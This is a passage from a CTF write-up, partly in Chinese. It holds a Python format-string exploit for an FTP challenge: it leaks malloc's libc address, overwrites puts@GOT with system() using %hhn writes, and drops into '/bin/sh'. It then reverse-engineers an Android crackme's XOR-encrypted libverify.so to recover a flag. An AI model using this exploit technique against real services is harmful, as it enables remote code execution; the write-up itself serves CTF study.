if len(data) ")
io.writeline("put")
io.read_until(":")
io.writeline(name)
io.read_until(":")
io.writeline(content)
def dir_file(io):
io.read_until("ftp>")
io.writeline("dir")
def get_file(io, name):
io.read_until("ftp>")
io.writeline("get")
io.read_until(":")
io.writeline(name)
def pwn(io):
#sample
#elf_info = get_elf_info(elf_path)
name = "sysbdmin"
io.read_until("Name (ftp.hacker.server:Rainism):")
io.writeline()
real_name = [chr(ord(c)-1) for c in name]
real_name = "".join(real_name)
io.writeline(real_name)
malloc_got = 0x0804a024
puts_got = 0x0804a028
name = "aaaa"
#content = "AAAA" + "B"*4 + "C"*4 + "%7$x."
content = l32(malloc_got) + "%7$s…."
put_file(io, name, content)
get_file(io, name)
data = io.read_until("….")
print [c for c in data]
malloc_addr = l32(data[4:8])
print "malloc_addr:", hex(malloc_addr)
#local
offset_malloc = 0x00076550
offset_system = 0x0003e800
#remote
offset_malloc = 0x000766b0
offset_system = 0x00040190
libc_base = malloc_addr – offset_malloc
system_addr = libc_base + offset_system
print "system_addr:", hex(system_addr)
addr_info = ""
padding_info = ""
system_addr_buff = l32(system_addr)
offset = 4*4
begin_index = 7
for i in range(4):
addr_info += l32(puts_got + i)
val = ord(system_addr_buff[i])
count = val – offset
if count <= 0:
count += 0x100
padding_info += "%%%dc"%count + "%%%d$hhn"%(begin_index + i)
offset = val
name = "/bin/sh;"
content = addr_info + padding_info
put_file(io, name, content)
io.gdb_hint()
get_file(io, name)
dir_file(io)
io.interact()
pass
io = get_io(target)
pwn(io)
成功截图:
AAAApk
Apk主要调用libverify.so中的sub_c9c进行check,但是这部分代码开始是被加过密的,所以首先需要简单解下密,解密部分在init中,如下:
解密完后,发现其实sub_c9c就是一个简单的异或处理,如下:
对输入进行base64解密后,与某个处理的串进行对比,正确就输出flag,此时都无需考虑输入,直接根据该串进行解密即可得到flag,其中解密代码和获取flag的代码如下:
__author__ = "pxx"
def decode_file():
file_r = open("libverify.so", "rb")
content = file_r.read()
file_r.close()
info = []
begin_pos = 0xC9D & 0xFFFFFFFE
for i in range(352):
info.append(chr((~ord(content[begin_pos+i]))&0xff))
print "".join(info)
file_w = open("libverify-decode.so", "wb")
content_new = content[:begin_pos] + "".join(info) +
content[begin_pos+len(info):]
file_w.write(content_new)
file_r.close()
def parse_something():
byte_4004 = [0x77, 8, 0x69, 0x4C, 0x7C, 0x6D, 0x4A, 0x7D, 0x66, 0x78, 0x62,
0x16, 0, 0, 0, 0]
byte_23f0 = [0xDE, 0xBF, 0xDC, 0xDB, 0xDA, 0xA1, 0xD9, 0xD5, 0xD7, 0xD6, 0xA0,
0xD4, 0]
for i in range(12):
byte_4004[i] ^= ((~byte_23f0[i])&0xff)